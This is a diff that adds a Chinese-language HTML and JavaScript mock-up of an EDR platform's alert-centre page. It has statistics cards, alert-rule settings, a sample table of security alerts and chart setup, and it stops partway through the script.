@@ -1,0 +1,1708 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>告警中心 - H-System EDR平台</title>
+    <style>
+        /* 基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft YaHei", sans-serif;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #f5f7fa;
+        }
+
+        /* 左侧菜单栏 */
+        .sidebar {
+            width: 220px;
+            background-color: #2c3e50;
+            color: white;
+            height: 100%;
+            transition: all 0.3s;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #34495e;
+        }
+
+        .sidebar-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            border-left: 3px solid transparent;
+            text-decoration: none;
+            color: white;
+        }
+
+        .menu-item:hover {
+            background-color: #34495e;
+        }
+
+        .menu-item.active {
+            background-color: #34495e;
+            border-left-color: #3498db;
+        }
+
+        .menu-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+
+        /* 右侧主内容区 */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .top-bar {
+            height: 60px;
+            background-color: white;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .user-info img {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-color: #ecf0f1;
+        }
+
+        .content-area {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background-color: #f5f7fa;
+        }
+
+        /* 页面通用样式 */
+        .page-title {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        /* 统计卡片 */
+        .stat-cards {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            flex: 1;
+            min-width: 200px;
+            background-color: white;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 15px;
+        }
+
+        .stat-card-title {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .stat-card-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+
+        .stat-card-trend {
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .trend-up {
+            color: #e74c3c;
+        }
+
+        .trend-down {
+            color: #27ae60;
+        }
+
+        /* 筛选栏 */
+        .filter-bar {
+            margin-bottom: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .filter-group {
+            display: flex;
+            align-items: center;
+        }
+
+        .filter-group label {
+            margin-right: 8px;
+            color: #666;
+        }
+
+        .filter-bar select, .filter-bar input {
+            padding: 6px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* 按钮样式 */
+        .btn {
+            padding: 6px 12px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn-primary {
+            background-color: #3498db;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #2980b9;
+        }
+
+        .btn-danger {
+            background-color: #e74c3c;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background-color: #c0392b;
+        }
+
+        .btn-warning {
+            background-color: #f39c12;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background-color: #d35400;
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            border: 1px solid #3498db;
+            color: #3498db;
+        }
+
+        .btn-outline:hover {
+            background-color: #3498db;
+            color: white;
+        }
+
+        /* 表格样式 */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        .data-table th, .data-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #ecf0f1;
+        }
+
+        .data-table th {
+            background-color: #f8f9fa;
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .data-table tr:hover {
+            background-color: #f8f9fa;
+        }
+
+        .table-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        /* 标签样式 */
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .tag-critical {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+
+        .tag-high {
+            background-color: #fed7d7;
+            color: #b91c1c;
+        }
+
+        .tag-medium {
+            background-color: #fef3c7;
+            color: #d97706;
+        }
+
+        .tag-low {
+            background-color: #dbeafe;
+            color: #1e40af;
+        }
+
+        .tag-unhandled {
+            background-color: #fef3c7;
+            color: #d97706;
+        }
+
+        .tag-handled {
+            background-color: #dcfce7;
+            color: #166534;
+        }
+
+        .tag-ignored {
+            background-color: #e5e7eb;
+            color: #4b5563;
+        }
+
+        /* 分页样式 */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 20px;
+        }
+
+        .pagination button {
+            padding: 5px 12px;
+            border: 1px solid #ddd;
+            background-color: white;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        .pagination button.active {
+            background-color: #3498db;
+            color: white;
+            border-color: #3498db;
+        }
+
+        .pagination button:hover:not(.active) {
+            background-color: #f1f1f1;
+        }
+
+        /* 弹窗样式 */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 6px;
+            width: 80%;
+            max-width: 900px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+
+        .modal-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h3 {
+            font-size: 18px;
+            color: #2c3e50;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-footer {
+            padding: 15px 20px;
+            border-top: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        /* 告警详情样式 */
+        .alert-detail-header {
+            margin-bottom: 20px;
+        }
+
+        .alert-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .alert-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 15px;
+            color: #666;
+        }
+
+        .alert-severity {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .detail-section {
+            margin-bottom: 25px;
+        }
+
+        .detail-section h4 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #ecf0f1;
+        }
+
+        .alert-description {
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .alert-actions {
+            background-color: #f8fafc;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+
+        .alert-actions h5 {
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .action-steps {
+            padding-left: 20px;
+            line-height: 1.6;
+        }
+
+        .evidence-item {
+            background-color: #f8fafc;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* 图表容器 */
+        .chart-container {
+            height: 300px;
+            position: relative;
+        }
+
+        /* 布局样式 */
+        .two-columns {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .two-columns > div {
+            flex: 1;
+        }
+
+        /* 提示消息样式 */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            z-index: 9999;
+            animation: fadeIn 0.3s, fadeOut 0.3s 2.7s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        /* 告警规则相关样式补充 */
+        .card-header-actions {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .bg-warning {
+            background-color: #fef3c7;
+            color: #d97706;
+        }
+        
+        .bg-danger {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+        
+        .bg-success {
+            background-color: #dcfce7;
+            color: #166534;
+        }
+        
+        .alert {
+            padding: 12px 15px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .alert-info {
+            background-color: #eff6ff;
+            color: #1e40af;
+            border: 1px solid #dbeafe;
+        }
+        
+        .table-responsive {
+            overflow-x: auto;
+        }
+        
+        .table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .table th, .table td {
+            padding: 10px 12px;
+            text-align: left;
+            border-bottom: 1px solid #ecf0f1;
+        }
+        
+        .table-hover tr:hover {
+            background-color: #f8fafc;
+        }
+        
+        .mb-4 {
+            margin-bottom: 20px;
+        }
+        
+        .modal-lg {
+            width: 90%;
+            max-width: 1000px;
+        }
+    </style>
+    <!-- 引入Font Awesome图标库 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- 引入Chart.js用于图表展示 -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <!-- 左侧菜单栏 -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h1>H-System EDR平台</h1>
+        </div>
+        <div class="menu-list">
+            <a href="index.html" class="menu-item">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>安全态势</span>
+            </a>
+            <a href="alert-center.html" class="menu-item active">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>告警中心</span>
+            </a>
+            <a href="investigation.html" class="menu-item">
+                <i class="fas fa-search"></i>
+                <span>调查与响应</span>
+            </a>
+            <a href="asset-management.html" class="menu-item">
+                <i class="fas fa-desktop"></i>
+                <span>资产管理</span>
+            </a>
+            <a href="threat-hunting.html" class="menu-item">
+                <i class="fas fa-crosshairs"></i>
+                <span>威胁狩猎</span>
+            </a>
+            <a href="threat-intelligence.html" class="menu-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>威胁情报</span>
+            </a>
+            <a href="report-center.html" class="menu-item">
+                <i class="fas fa-file-alt"></i>
+                <span>报告中心</span>
+            </a>
+            <a href="system-management.html" class="menu-item">
+                <i class="fas fa-cog"></i>
+                <span>系统管理</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- 右侧主内容区 -->
+    <div class="main-container">
+        <div class="top-bar">
+            <div class="breadcrumbs">当前位置: <span id="breadcrumb">告警中心</span></div>
+            <div class="user-info">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='30' r='20' fill='%233498db'/%3E%3Cpath d='M10,90 C10,65 30,55 50,55 C70,55 90,65 90,90' fill='%233498db'/%3E%3C/svg%3E" alt="用户头像">
+                <span>安全分析师</span>
+            </div>
+        </div>
+
+        <div class="content-area">
+            <h2 class="page-title">告警中心</h2>
+            
+            <!-- 统计卡片 -->
+            <div class="stat-cards">
+                <div class="stat-card">
+                    <div class="stat-card-title">总告警数</div>
+                    <div class="stat-card-value">159</div>
+                    <div class="stat-card-trend trend-up"><i class="fas fa-arrow-up"></i> 24 今日新增</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-title">未处理告警</div>
+                    <div class="stat-card-value">47</div>
+                    <div class="stat-card-trend trend-up"><i class="fas fa-arrow-up"></i> 5 较昨日</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-title">紧急告警</div>
+                    <div class="stat-card-value">12</div>
+                    <div class="stat-card-trend trend-down"><i class="fas fa-arrow-down"></i> 3 较昨日</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-title">高危告警</div>
+                    <div class="stat-card-value">35</div>
+                    <div class="stat-card-trend trend-up"><i class="fas fa-arrow-up"></i> 7 较昨日</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-title">处理完成率</div>
+                    <div class="stat-card-value">70%</div>
+                    <div class="stat-card-trend trend-up"><i class="fas fa-arrow-up"></i> 5% 较上周</div>
+                </div>
+            </div>
+
+            <!-- 图表区域 -->
+            <div class="two-columns">
+                <div class="card">
+                    <h3 style="margin-bottom: 15px;">告警趋势（近7天）</h3>
+                    <div class="chart-container">
+                        <canvas id="alertTrendChart"></canvas>
+                    </div>
+                </div>
+                <div class="card">
+                    <h3 style="margin-bottom: 15px;">告警类型分布</h3>
+                    <div class="chart-container">
+                        <canvas id="alertTypeChart"></canvas>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 告警规则管理按钮 -->
+            <div class="card-header-actions">
+                <button class="btn btn-primary" onclick="showAlertRulesModal()">
+                    <i class="fas fa-cog"></i> 管理告警规则
+                </button>
+            </div>
+
+            <!-- 告警规则配置弹窗 -->
+            <div id="alertRulesModal" class="modal">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5 class="modal-title" id="alertRulesModalTitle">告警规则配置</h5>
+                            <button type="button" class="modal-close" onclick="closeAlertRulesModal()">&times;</button>
+                        </div>
+                        <div class="modal-body">
+                            <div class="alert alert-info">
+                                <i class="fas fa-info-circle"></i> 配置告警触发条件和通知方式，满足条件时系统将自动发送告警
+                            </div>
+                            
+                            <!-- 告警规则列表 -->
+                            <div class="mb-4">
+                                <h6>现有告警规则</h6>
+                                <div class="table-responsive">
+                                    <table class="table table-hover">
+                                        <thead>
+                                            <tr>
+                                                <th>规则名称</th>
+                                                <th>触发条件</th>
+                                                <th>严重级别</th>
+                                                <th>状态</th>
+                                                <th>操作</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td>CPU使用率过高</td>
+                                                <td>CPU使用率持续5分钟超过90%</td>
+                                                <td><span class="badge bg-warning">警告</span></td>
+                                                <td><span class="badge bg-success">启用</span></td>
+                                                <td>
+                                                    <button class="btn btn-sm btn-outline-primary" onclick="editAlertRule(1)">编辑</button>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>内存使用率过高</td>
+                                                <td>内存使用率持续5分钟超过90%</td>
+                                                <td><span class="badge bg-warning">警告</span></td>
+                                                <td><span class="badge bg-success">启用</span></td>
+                                                <td>
+                                                    <button class="btn btn-sm btn-outline-primary" onclick="editAlertRule(2)">编辑</button>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>恶意文件检测</td>
+                                                <td>检测到恶意文件</td>
+                                                <td><span class="badge bg-danger">严重</span></td>
+                                                <td><span class="badge bg-success">启用</span></td>
+                                                <td>
+                                                    <button class="btn btn-sm btn-outline-primary" onclick="editAlertRule(3)">编辑</button>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>异常登录检测</td>
+                                                <td>检测到异地登录或异常时间登录</td>
+                                                <td><span class="badge bg-danger">严重</span></td>
+                                                <td><span class="badge bg-danger">禁用</span></td>
+                                                <td>
+                                                    <button class="btn btn-sm btn-outline-primary" onclick="editAlertRule(4)">编辑</button>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                            
+                            <!-- 添加新规则按钮 -->
+                            <button class="btn btn-success" onclick="showAddAlertRuleForm()">
+                                <i class="fas fa-plus"></i> 添加新告警规则
+                            </button>
+                            
+                            <!-- 告警规则编辑表单 (默认隐藏) -->
+                            <div id="alertRuleForm" class="mt-4" style="display: none;">
+                                <hr>
+                                <h6 id="alertRuleFormTitle">编辑告警规则</h6>
+                                
+                                <form id="ruleForm">
+                                    <input type="hidden" id="ruleId">
+                                    
+                                    <div class="form-group">
+                                        <label for="ruleName">规则名称</label>
+                                        <input type="text" class="form-control" id="ruleName" placeholder="输入规则名称">
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <label for="ruleCategory">规则类别</label>
+                                        <select class="form-control" id="ruleCategory">
+                                            <option value="performance">性能告警</option>
+                                            <option value="security">安全告警</option>
+                                            <option value="system">系统告警</option>
+                                            <option value="network">网络告警</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <label for="ruleSeverity">严重级别</label>
+                                        <select class="form-control" id="ruleSeverity">
+                                            <option value="info">信息</option>
+                                            <option value="warning">警告</option>
+                                            <option value="critical">严重</option>
+                                            <option value="emergency">紧急</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <label>触发条件</label>
+                                        <div class="row">
+                                            <div class="col-md-4">
+                                                <select class="form-control" id="ruleMetric">
+                                                    <option value="cpu">CPU使用率</option>
+                                                    <option value="memory">内存使用率</option>
+                                                    <option value="disk">磁盘使用率</option>
+                                                    <option value="network">网络流量</option>
+                                                    <option value="malware">恶意软件检测</option>
+                                                    <option value="login">登录行为</option>
+                                                </select>
+                                            </div>
+                                            <div class="col-md-2">
+                                                <select class="form-control" id="ruleOperator">
+                                                    <option value="gt">大于</option>
+                                                    <option value="lt">小于</option>
+                                                    <option value="gte">大于等于</option>
+                                                    <option value="lte">小于等于</option>
+                                                    <option value="eq">等于</option>
+                                                    <option value="detect">检测到</option>
+                                                </select>
+                                            </div>
+                                            <div class="col-md-2">
+                                                <input type="text" class="form-control" id="ruleThreshold" placeholder="阈值">
+                                            </div>
+                                            <div class="col-md-4">
+                                                <select class="form-control" id="ruleDuration">
+                                                    <option value="0">立即触发</option>
+                                                    <option value="300">持续5分钟</option>
+                                                    <option value="900">持续15分钟</option>
+                                                    <option value="1800">持续30分钟</option>
+                                                    <option value="3600">持续1小时</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <label>通知方式</label>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="checkbox" id="notifySystem" checked>
+                                            <label class="form-check-label" for="notifySystem">系统内通知</label>
+                                        </div>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="checkbox" id="notifyEmail">
+                                            <label class="form-check-label" for="notifyEmail">电子邮件</label>
+                                        </div>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="checkbox" id="notifySms">
+                                            <label class="form-check-label" for="notifySms">短信通知</label>
+                                        </div>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="checkbox" id="notifyWebhook">
+                                            <label class="form-check-label" for="notifyWebhook">Webhook</label>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <label for="ruleDescription">规则描述</label>
+                                        <textarea class="form-control" id="ruleDescription" rows="3" placeholder="描述此告警规则的用途和触发场景"></textarea>
+                                    </div>
+                                    
+                                    <div class="form-group form-check">
+                                        <input type="checkbox" class="form-check-input" id="ruleEnabled" checked>
+                                        <label class="form-check-label" for="ruleEnabled">启用此规则</label>
+                                    </div>
+                                    
+                                    <div class="form-group">
+                                        <button type="button" class="btn btn-secondary" onclick="hideAlertRuleForm()">取消</button>
+                                        <button type="button" class="btn btn-primary" onclick="saveAlertRule()">保存规则</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn btn-secondary" onclick="closeAlertRulesModal()">关闭</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 告警列表 -->
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                    <h3>告警列表</h3>
+                    <div>
+                        <button class="btn btn-primary" onclick="handleAllSelected()"><i class="fas fa-check"></i> 批量处理</button>
+                        <button class="btn btn-outline" onclick="exportAlerts()"><i class="fas fa-download"></i> 导出</button>
+                    </div>
+                </div>
+
+                <div class="filter-bar">
+                    <div class="filter-group">
+                        <label for="alert-severity">告警级别：</label>
+                        <select id="alert-severity">
+                            <option value="all">全部级别</option>
+                            <option value="critical">紧急</option>
+                            <option value="high">高危</option>
+                            <option value="medium">中危</option>
+                            <option value="low">低危</option>
+                        </select>
+                    </div>
+
+                    <div class="filter-group">
+                        <label for="alert-status">处理状态：</label>
+                        <select id="alert-status">
+                            <option value="all">全部状态</option>
+                            <option value="unhandled">未处理</option>
+                            <option value="handling">处理中</option>
+                            <option value="handled">已处理</option>
+                            <option value="ignored">已忽略</option>
+                        </select>
+                    </div>
+
+                    <div class="filter-group">
+                        <label for="alert-source">告警来源：</label>
+                        <select id="alert-source">
+                            <option value="all">全部来源</option>
+                            <option value="server">服务器</option>
+                            <option value="workstation">工作站</option>
+                            <option value="mobile">移动设备</option>
+                            <option value="honeypot">蜜罐资产</option>
+                        </select>
+                    </div>
+
+                    <div class="filter-group">
+                        <label for="alert-time">时间范围：</label>
+                        <select id="alert-time">
+                            <option value="24h">近24小时</option>
+                            <option value="7d" selected>近7天</option>
+                            <option value="30d">近30天</option>
+                            <option value="custom">自定义</option>
+                        </select>
+                    </div>
+
+                    <div class="filter-group">
+                        <label for="search-alert">搜索：</label>
+                        <input type="text" id="search-alert" placeholder="告警名称/资产/IP">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="filterAlerts()"><i class="fas fa-filter"></i> 筛选</button>
+                    <button class="btn btn-outline" onclick="resetAlertFilters()"><i class="fas fa-sync-alt"></i> 重置</button>
+                </div>
+
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="select-all"></th>
+                            <th>告警名称</th>
+                            <th>资产</th>
+                            <th>IP地址</th>
+                            <th>级别</th>
+                            <th>类型</th>
+                            <th>状态</th>
+                            <th>发生时间</th>
+                            <th>操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><input type="checkbox" class="alert-select"></td>
+                            <td>检测到Emotet恶意软件活动</td>
+                            <td>WIN-SERVER-01</td>
+                            <td>192.168.1.101</td>
+                            <td><span class="tag tag-critical">紧急</span></td>
+                            <td>恶意软件</td>
+                            <td><span class="tag tag-unhandled">未处理</span></td>
+                            <td>2025-08-27 14:32:15</td>
+                            <td class="table-actions">
+                                <button class="btn btn-primary" onclick="showAlertDetail(1)"><i class="fas fa-info-circle"></i></button>
+                                <button class="btn btn-warning" onclick="handleAlert(1)"><i class="fas fa-check"></i></button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><input type="checkbox" class="alert-select"></td>
+                            <td>可疑PowerShell编码命令执行</td>
+                            <td>DESKTOP-8F3K29A</td>
+                            <td>192.168.2.56</td>
+                            <td><span class="tag tag-high">高危</span></td>
+                            <td>可疑脚本</td>
+                            <td><span class="tag tag-unhandled">未处理</span></td>
+                            <td>2025-08-27 13:45:02</td>
+                            <td class="table-actions">
+                                <button class="btn btn-primary" onclick="showAlertDetail(2)"><i class="fas fa-info-circle"></i></button>
+                                <button class="btn btn-warning" onclick="handleAlert(2)"><i class="fas fa-check"></i></button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><input type="checkbox" class="alert-select"></td>
+                            <td>检测到横向移动尝试</td>
+                            <td>SRV-DB-02</td>
+                            <td>192.168.1.205</td>
+                            <td><span class="tag tag-high">高危</span></td>
+                            <td>横向移动</td>
+                            <td><span class="tag tag-handling">处理中</span></td>
+                            <td>2025-08-27 11:23:45</td>
+                            <td class="table-actions">
+                                <button class="btn btn-primary" onclick="showAlertDetail(3)"><i class="fas fa-info-circle"></i></button>
+                                <button class="btn btn-primary" onclick="completeHandle(3)"><i class="fas fa-check-double"></i></button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><input type="checkbox" class="alert-select"></td>
+                            <td>异常注册表持久化项创建</td>
+                            <td>DESKTOP-USER05</td>
+                            <td>192.168.2.89</td>
+                            <td><span class="tag tag-medium">中危</span></td>
+                            <td>持久化</td>
+                            <td><span class="tag tag-handled">已处理</span></td>
+                            <td>2025-08-27 10:15:32</td>
+                            <td class="table-actions">
+                                <button class="btn btn-primary" onclick="showAlertDetail(4)"><i class="fas fa-info-circle"></i></button>
+                                <button class="btn btn-outline" onclick="viewHandleRecord(4)"><i class="fas fa-history"></i></button>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><input type="checkbox" class="alert-select"></td>
+                            <td>与已知恶意IP的连接尝试</td>
+                            <td>LAPTOP-SALES03</td>
+                            <td>192.168.2.110</td>
+                            <td><span class="tag tag-medium">中危</span></td>
+                            <td>恶意连接</td>
+                            <td><span class="tag tag-ignored">已忽略</span></td>
+                            <td>2025-08-27 09:08:17</td>
+                            <td class="table-actions">
+                                <button class="btn btn-primary" onclick="showAlertDetail(5)"><i class="fas fa-info-circle"></i></button>
+                                <button class="btn btn-warning" onclick="unignoreAlert(5)"><i class="fas fa-undo"></i></button>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <!-- 分页 -->
+                <div class="pagination">
+                    <button disabled><i class="fas fa-chevron-left"></i></button>
+                    <button class="active">1</button>
+                    <button>2</button>
+                    <button>3</button>
+                    <button>4</button>
+                    <button>5</button>
+                    <button><i class="fas fa-chevron-right"></i></button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 告警详情弹窗 -->
+    <div class="modal" id="alertDetailModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="alertDetailTitle">告警详情</h3>
+                <button class="modal-close" onclick="closeAlertDetailModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="alertDetailBody">
+                <!-- 内容将通过JS动态填充 -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="ignoreAlert()"><i class="fas fa-ban"></i> 忽略</button>
+                <button class="btn btn-warning" onclick="startHandleAlert()"><i class="fas fa-tools"></i> 开始处理</button>
+                <button class="btn btn-danger" onclick="isolateAlertAsset()"><i class="fas fa-shield-alt"></i> 隔离资产</button>
+                <button class="btn btn-primary" onclick="closeAlertDetailModal()">关闭</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 处理告警弹窗 -->
+    <div class="modal" id="handleAlertModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>处理告警</h3>
+                <button class="modal-close" onclick="closeHandleAlertModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="handle-method">处理方式</label>
+                    <select id="handle-method" class="form-control">
+                        <option value="quarantine">隔离文件/进程</option>
+                        <option value="delete">删除恶意文件</option>
+                        <option value="block">阻断连接</option>
+                        <option value="manual">手动处理</option>
+                        <option value="none">无需处理（误报）</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="handle-notes">处理记录</label>
+                    <textarea id="handle-notes" class="form-control" rows="5" placeholder="请输入处理过程和结果..."></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="handle-attachment">上传处理证据（可选）</label>
+                    <input type="file" id="handle-attachment" class="form-control">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeHandleAlertModal()">取消</button>
+                <button class="btn btn-primary" onclick="submitHandleResult()">提交处理结果</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            // 初始化告警趋势图表
+            const alertTrendCtx = document.getElementById('alertTrendChart').getContext('2d');
+            const alertTrendChart = new Chart(alertTrendCtx, {
+                type: 'line',
+                data: {
+                    labels: ['8/21', '8/22', '8/23', '8/24', '8/25', '8/26', '8/27'],
+                    datasets: [{
+                        label: '紧急',
+                        data: [3, 2, 5, 4, 3, 6, 5],
+                        borderColor: '#dc2626',
+                        backgroundColor: 'rgba(220, 38, 38, 0.1)',
+                        tension: 0.3,
+                        fill: true
+                    }, {
+                        label: '高危',
+                        data: [8, 10, 7, 9, 12, 8, 9],
+                        borderColor: '#b91c1c',
+                        backgroundColor: 'rgba(185, 28, 28, 0.1)',
+                        tension: 0.3,
+                        fill: true
+                    }, {
+                        label: '中危',
+                        data: [15, 12, 18, 14, 16, 19, 15],
+                        borderColor: '#d97706',
+                        backgroundColor: 'rgba(217, 119, 6, 0.1)',
+                        tension: 0.3,
+                        fill: true
+                    }, {
+                        label: '低危',
+                        data: [22, 18, 25, 20, 24, 19, 21],
+                        borderColor: '#1e40af',
+                        backgroundColor: 'rgba(30, 64, 175, 0.1)',
+                        tension: 0.3,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'top',
+                        }
+                    },
+                    scales: {
+                        y: {
+                            beginAtZero: true
+                        }
+                    }
+                }
+            });
+
+            // 初始化告警类型分布图表
